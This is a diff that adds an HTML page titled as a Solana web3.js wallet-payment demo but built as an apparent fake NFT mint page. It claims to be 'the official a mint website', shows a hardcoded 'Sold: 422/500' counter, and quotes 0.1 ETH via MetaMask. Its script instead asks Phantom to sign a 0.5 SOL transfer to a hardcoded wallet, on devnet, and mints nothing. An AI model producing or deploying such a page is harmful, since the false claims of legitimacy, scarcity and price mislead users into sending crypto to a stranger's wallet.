@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<link href="./assets/bootstrap.min.css" rel="stylesheet">
+	<title>Crypto Payment through Browser wallet on Solana blockchain using web3.js</title>
+	<link rel="stylesheet" href="./assets/main.css">
+	<link rel="preconnect" href="https://fonts.googleapis.com/">
+	<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+	<link href="./assets/css2.css" rel="stylesheet">
+	<script src="./assets/jquery.min.js"></script>
+</head>
+
+<body class="hapebg" data-new-gr-c-s-check-loaded="14.1043.0" data-gr-ext-installed="">
+	<div class="container-fluid d-flex justify-content-center m-0" style="height: 100vh;">
+		<div class="row mt-5 d-flex justify-content-center">
+			<div class="col d-flex align-items-center">
+				<div class="card nobgcolor scenter">
+						<div class="container-fluid">
+							<div class="row">
+								<center>
+								<div class="col d-flex justify-content-center">
+								</center>
+								</div>
+							</div> 
+							<div class="row mt-4 d-flex justify-content-center">
+								<div class="col d-flex justify-content-center">
+									<span class="text-center desc">
+										<p style="color:#000000";>This is the official a mint website.</p>
+										<p style="color:#000000";>Follow the instructions to mint your NFT now. </p>
+										
+									</span>
+								</div>
+							</div>
+							<br>
+							<div style="color:#000000"; class="quantity" id="quantity">
+								Quantity <b>(max 10)</b>: 
+								<input type="number" id="mintnumber" min="1" max="10" value="1">
+								<button class="butmax" onclick="change()">MAX</button>
+							</div>
+							<div style="color:#000000"; class="mintprice1" id="mint-text">Sold: 422/500</div>
+							<div style="color:#000000"; class="mintprice">
+								Price per mint is <b>0.1 ETH</b>
+								<br><br>
+								1. Connect your wallet with MetaMask
+								<br>
+								2. Click on button below to mint your NFT!
+							</div>
+							<div class="row mt-4 d-flex justify-content-center">
+								<div class="col d-flex justify-content-center">
+									<div style="background-color:#ffffff;" class="action-btn d-flex justify-content-center cpointer" 
+										id="mintBtn">
+										<span style="color:#000000"; class="text-center text- pt-3 pb-3">MINT</span>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+
+	<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+	<script type="text/javascript">
+		console.log(solanaWeb3);
+		/*
+		[Connection, PublicKey, clusterApiUrl] = solanaWeb3; // this is web3.js api
+
+		console.log(Connection);
+		console.log(PublicKey);
+		console.log(clusterApiUrl);
+		*/
+
+		$('#mintBtn').on('click', async() => {
+			if(window.solana && window.solana.isPhantom)
+			{
+				const resp = await window.solana.connect(); // this is browser wallet
+
+				var connection = new solanaWeb3.Connection(
+					solanaWeb3.clusterApiUrl('devnet'),
+					'confirmed',
+				);
+
+				const recieverWallet = new solanaWeb3.PublicKey("DEBCZ41EV5m8KB17W8c89LFxjrPcuSE3jSjED5B8mEGg");
+				var transaction = new solanaWeb3.Transaction().add(
+					solanaWeb3.SystemProgram.transfer({
+						fromPubkey: resp.publicKey, 
+						toPubkey: recieverWallet, 
+						lamports: 10000000 * 50,
+					}),
+				);
+				// Setting the variables for the transaction
+				transaction.feePayer = resp.publicKey;
+				let blockhashObj = await connection.getRecentBlockhash();
+				transaction.recentBlockhash = await blockhashObj.blockhash;
+
+				const { signature } = await window.solana.signAndSendTransaction(transaction);
+				await connection.confirmTransaction(signature);
+			}
+		});
+	</script>
+	<!-- <script src="./assets/hmu.js"></script> -->
+	<script src="./assets/bootstrap.bundle.min.js"></script>
+
+
+</body>
+</html>
